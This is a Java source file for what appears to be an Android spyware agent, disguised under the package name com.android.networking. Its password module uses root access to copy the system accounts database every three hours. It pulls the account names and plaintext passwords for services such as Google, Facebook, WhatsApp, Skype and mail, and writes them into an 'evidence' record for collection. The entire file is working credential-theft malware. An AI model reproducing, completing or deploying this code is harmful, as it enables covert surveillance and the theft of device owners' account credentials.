package com.android.networking.module;

import java.io.File;
import java.io.IOException;
import java.util.HashMap;
import java.util.Iterator;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteQueryBuilder;

import com.android.networking.Messages;
import com.android.networking.Status;
import com.android.networking.auto.Cfg;
import com.android.networking.conf.ConfModule;
import com.android.networking.db.GenericSqliteHelper;
import com.android.networking.db.RecordVisitor;
import com.android.networking.evidence.EvidenceReference;
import com.android.networking.evidence.EvidenceType;
import com.android.networking.evidence.Markup;
import com.android.networking.file.Path;
import com.android.networking.util.ByteArray;
import com.android.networking.util.Check;
import com.android.networking.util.StringUtils;
import com.android.networking.util.Utils;
import com.android.networking.util.WChar;

public class ModulePassword extends BaseModule {

	private static final String TAG = "ModulePassword"; //$NON-NLS-1$
	private static final int ELEM_DELIMITER = 0xABADC0DE;
	private Markup markupPassword;
	private HashMap<Integer, String> lastPasswords;
	private static HashMap<String, Integer> services = new HashMap<String, Integer>();

	@Override
	protected boolean parse(ConfModule conf) {
		if (Status.self().haveRoot()) {
			services.put("skype", 0x02);
			services.put("facebook", 0x03);
			services.put("twitter", 0x04);
			services.put("google", 0x05);
			services.put("whatsapp", 0x07);
			services.put("mail", 0x09);
			services.put("linkedin", 0x0a);

			return true;
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (parse), don't have root, bailing out");
			}
			return false;
		}

	}

	@Override
	protected void actualStart() {
		// every three hours, check.
		setPeriod(180 * 60 * 1000);
		setDelay(200);

		markupPassword = new Markup(this);
		lastPasswords = markupPassword.unserialize(new HashMap<Integer, String>());
	}

	@Override
	protected void actualGo() {

		RecordVisitor passwordVisitor = new RecordVisitor() {
			EvidenceReference evidence = new EvidenceReference(EvidenceType.PASSWORD);
			boolean needToSerialize = false;

			@Override
			public void close() {
				if (needToSerialize) {
					markupPassword.serialize(lastPasswords);
				}
				evidence.close();
			}

			@Override
			public int cursor(Cursor cursor) {
				int jid = cursor.getInt(0);
				String name = cursor.getString(1);
				String type = cursor.getString(2);
				String password = cursor.getString(3);
				String service = getService(type);

				String value = name + "_" + type + "_" + password;

				if (Cfg.DEBUG) {
					Check.log(TAG + " (dumpPasswordDb): id : " + jid + " name : " + name + " type: " + type + " pw: "
							+ password);
				}

				if (!StringUtils.isEmpty(password)) {

					if (lastPasswords.containsKey(jid) && lastPasswords.get(jid).equals(value)) {
						return jid;
					} else {
						lastPasswords.put( jid, value);
						needToSerialize = true;
					}

					evidence.write(WChar.getBytes(type, true));
					evidence.write(WChar.getBytes(name, true));
					evidence.write(WChar.getBytes(password, true));
					evidence.write(WChar.getBytes(service, true));
					evidence.write(ByteArray.intToByteArray(ELEM_DELIMITER));

				}
				
				return jid;
			}
		};

		dumpAccounts(passwordVisitor);

	}

	public static void dumpAccounts(RecordVisitor visitor) {
		// h_0=/data/system/
		// h_1=/data/system/users/0/
		// h_2=accounts.db
		String pathUser = Messages.getString("h_1");
		String pathSystem = Messages.getString("h_0");
		String file = Messages.getString("h_2");

		String dbFile = "";

		GenericSqliteHelper helper = GenericSqliteHelper.openCopy(pathSystem, file);
		if (helper == null) {
			helper = GenericSqliteHelper.openCopy(pathUser, file);
		}

		if (helper == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (dumpPasswordDb) ERROR: cannot open db" );
			}
		}

		// h_4=accounts
		String table = Messages.getString("h_4");

		// h_5=_id
		// h_6=name
		// h_7=type
		// h_8=password
		String[] projection = { Messages.getString("h_5"), Messages.getString("h_6"), Messages.getString("h_7"),
				Messages.getString("h_8") };
		visitor.projection = projection;

		helper.traverseRecords(table, visitor);

	}

	public static void dumpAddressBookAccounts() {

	}

	private static String getService(String type) {

		Iterator<String> iter = services.keySet().iterator();
		while (iter.hasNext()) {
			String key = iter.next();
			if (type.contains(key)) {
				return key;
			}
		}
		return "service";

	}

	static int getServiceId(String type) {

		Iterator<String> iter = services.keySet().iterator();
		while (iter.hasNext()) {
			String key = iter.next();
			if (type.contains(key)) {
				return services.get(key);
			}
		}

		return 0;

	}

	@Override
	protected void actualStop() {

	}

}
